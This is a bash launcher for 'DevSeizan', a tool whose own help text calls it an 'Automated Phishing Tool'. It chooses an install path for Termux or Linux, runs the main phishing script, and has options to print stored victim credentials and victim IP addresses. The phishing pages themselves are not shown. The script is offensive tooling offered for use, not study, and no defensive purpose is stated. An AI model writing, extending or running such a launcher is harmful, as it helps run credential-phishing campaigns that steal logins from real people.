#!/bin/bash

# https://github.com/dev-seizan/devseizan

if [[ $(uname -o) == *'Android'* ]]; then
	DEVSEIZAN_ROOT="/data/data/com.termux/files/usr/opt/devseizan"
else
	export DEVSEIZAN_ROOT="/opt/devseizan"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "DevSeizan - Automated Phishing Tool"
	echo ""
	echo "Usage: devseizan"
	echo ""
	echo "Options:"
	echo " -h | help : Show this help"
	echo " -c | auth : View captured credentials"
	echo " -i | ip   : View captured victim IPs"
	echo ""
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat "$DEVSEIZAN_ROOT/auth/usernames.txt" 2>/dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat "$DEVSEIZAN_ROOT/auth/ip.txt" 2>/dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd "$DEVSEIZAN_ROOT"
	bash ./devseizan.sh
fi